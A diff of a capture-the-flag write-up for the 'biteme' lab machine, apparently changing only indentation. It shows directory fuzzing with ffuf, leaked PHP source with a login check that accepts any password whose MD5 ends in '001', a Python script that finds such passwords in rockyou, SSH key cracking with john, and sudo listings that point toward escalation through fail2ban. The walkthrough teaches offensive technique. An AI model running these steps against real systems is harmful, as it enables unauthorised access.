@@ -4,8 +4,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -19,27 +19,27 @@ Simple apache2 page, source code is normal too, let's fuzz:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.64.184/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.64.184/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.64.184/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-console                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 177ms]
+console [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 177ms]
 ```
 
 We got `console`, let's check it out:
@@ -64,32 +64,32 @@ That means we should be able to read the source code of `.phps` files, let's fuz
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.64.184/console/FUZZ" -ic -c -t 200 -e .phps
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.64.184/console/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .phps
+ :: Method : GET
+ :: URL : http://10.10.64.184/console/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Extensions : .phps
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-.phps                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 175ms]
-index.phps              [Status: 200, Size: 9325, Words: 297, Lines: 3, Duration: 177ms]
-css                     [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 176ms]
-config.phps             [Status: 200, Size: 354, Words: 17, Lines: 4, Duration: 211ms]
-functions.phps          [Status: 200, Size: 2010, Words: 93, Lines: 4, Duration: 177ms]
+.phps [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 175ms]
+index.phps [Status: 200, Size: 9325, Words: 297, Lines: 3, Duration: 177ms]
+css [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 176ms]
+config.phps [Status: 200, Size: 354, Words: 17, Lines: 4, Duration: 211ms]
+functions.phps [Status: 200, Size: 2010, Words: 93, Lines: 4, Duration: 177ms]
 ```
 
 Let's check those files out:
@@ -107,49 +107,49 @@ $showError = false;
 $showCaptchaError = false;
 
 if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
-    $image = new Securimage();
+ $image = new Securimage();
 
-    if (!$image->check($_POST['captcha_code'])) {
-        $showCaptchaError = true;
-    } else {
-        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
-            setcookie('user', $_POST['user'], 0, '/');
-            setcookie('pwd', $_POST['pwd'], 0, '/');
-            header('Location: mfa.php');
-            exit();
-        } else {
-            $showError = true;
-        }
-    }
+ if (!$image->check($_POST['captcha_code'])) {
+ $showCaptchaError = true;
+ } else {
+ if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
+ setcookie('user', $_POST['user'], 0, '/');
+ setcookie('pwd', $_POST['pwd'], 0, '/');
+ header('Location: mfa.php');
+ exit();
+ } else {
+ $showError = true;
+ }
+ }
 }
 ?>
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <title>Sign in</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
-    <link rel="stylesheet" href="/console/css/style.css">
-    <script>
-      function handleSubmit() {
-        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
-        return true;
-      }
-    </script>
-  </head>
-  <body class="text-center">
-    <form action="index.php" method="post" class="form-signin" onsubmit="return handleSubmit()">
-        <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
-        <input type="text" name="user" class="form-control" placeholder="Username" required>
-        <input type="password" name="pwd" class="form-control" placeholder="Password" required>
-        <?php echo Securimage::getCaptchaHtml(); ?>
-        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
-        <input type="hidden" name="clicked" id="clicked" value="">
-        <?php if ($showCaptchaError): ?><p class="mt-3 mb-3 text-danger">Incorrect captcha</p><?php endif ?>
-        <?php if ($showError): ?><p class="mt-3 mb-3 text-danger">Incorrect details</p><?php endif ?>
-    </form>
-  </body>
+ <head>
+ <meta charset="utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+ <title>Sign in</title>
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
+ <link rel="stylesheet" href="/console/css/style.css">
+ <script>
+ function handleSubmit() {
+ eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
+ return true;
+ }
+ </script>
+ </head>
+ <body class="text-center">
+ <form action="index.php" method="post" class="form-signin" onsubmit="return handleSubmit()">
+ <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
+ <input type="text" name="user" class="form-control" placeholder="Username" required>
+ <input type="password" name="pwd" class="form-control" placeholder="Password" required>
+ <?php echo Securimage::getCaptchaHtml(); ?>
+ <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+ <input type="hidden" name="clicked" id="clicked" value="">
+ <?php if ($showCaptchaError): ?><p class="mt-3 mb-3 text-danger">Incorrect captcha</p><?php endif ?>
+ <?php if ($showError): ?><p class="mt-3 mb-3 text-danger">Incorrect details</p><?php endif ?>
+ </form>
+ </body>
 </html>
 ```
 
@@ -161,16 +161,16 @@ if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code'
 include('config.php');
 
 function is_valid_user($user) {
-    $user = bin2hex($user);
+ $user = bin2hex($user);
 
-    return $user === LOGIN_USER;
+ return $user === LOGIN_USER;
 }
 
 // @fred let's talk about ways to make this more secure but still flexible
 function is_valid_pwd($pwd) {
-    $hash = md5($pwd);
+ $hash = md5($pwd);
 
-    return substr($hash, -3) === '001';
+ return substr($hash, -3) === '001';
 } 
 ```
 
@@ -210,31 +210,31 @@ TARGET_SUFFIX = '001'
 MAX_RESULTS = 10
 
 def md5_endswith(word: str, suffix: str) -> bool:
-    return hashlib.md5(word.encode('utf-8')).hexdigest().endswith(suffix)
+ return hashlib.md5(word.encode('utf-8')).hexdigest().endswith(suffix)
 
 def search_rockyou():
-    found = []
-    try:
-        with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
-            for line in f:
-                for word in line.split():
-                    if md5_endswith(word, TARGET_SUFFIX):
-                        found.append(word)
-                        if len(found) >= MAX_RESULTS:
-                            return found
-        return found
-    except FileNotFoundError:
-        print(f"Wordlist not found at {WORDLIST_PATH}", file=sys.stderr)
-        sys.exit(1)
+ found = []
+ try:
+ with open(WORDLIST_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+ for line in f:
+ for word in line.split():
+ if md5_endswith(word, TARGET_SUFFIX):
+ found.append(word)
+ if len(found) >= MAX_RESULTS:
+ return found
+ return found
+ except FileNotFoundError:
+ print(f"Wordlist not found at {WORDLIST_PATH}", file=sys.stderr)
+ sys.exit(1)
 
 if __name__ == '__main__':
-    results = search_rockyou()
-    if results:
-        print("[+] You can use these passwords:")
-        for pwd in results:
-            print(pwd)
-    else:
-        print("No matches found.")
+ results = search_rockyou()
+ if results:
+ print("[+] You can use these passwords:")
+ for pwd in results:
+ print(pwd)
+ else:
+ print("No matches found.")
 
 ```
 
@@ -347,7 +347,7 @@ It is encrypted, which means we need to use `ssh2john` to crack it:
 nano id_rsa
 ssh2john id_rsa > id_rsa.hash
 john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
-1a2b3c4d         (id_rsa)
+1a2b3c4d (id_rsa)
 ```
 
 There we go, we got it, let's proceed to ssh then:
@@ -375,11 +375,11 @@ Let's check our privileges:
 ```
 jason@biteme:~$ sudo -l
 Matching Defaults entries for jason on biteme:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User jason may run the following commands on biteme:
-    (ALL : ALL) ALL
-    (fred) NOPASSWD: ALL
+ (ALL : ALL) ALL
+ (fred) NOPASSWD: ALL
 ```
 
 We can run any commands as fred without a password, let's switch users then:
@@ -395,10 +395,10 @@ Let's check our privileges then:
 ```
 fred@biteme:~$ sudo -l
 Matching Defaults entries for fred on biteme:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+ env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User fred may run the following commands on biteme:
-    (root) NOPASSWD: /bin/systemctl restart fail2ban
+ (root) NOPASSWD: /bin/systemctl restart fail2ban
 ```
 
 We can restart the fail2ban service, let's check info on how to escalate privileges with it:
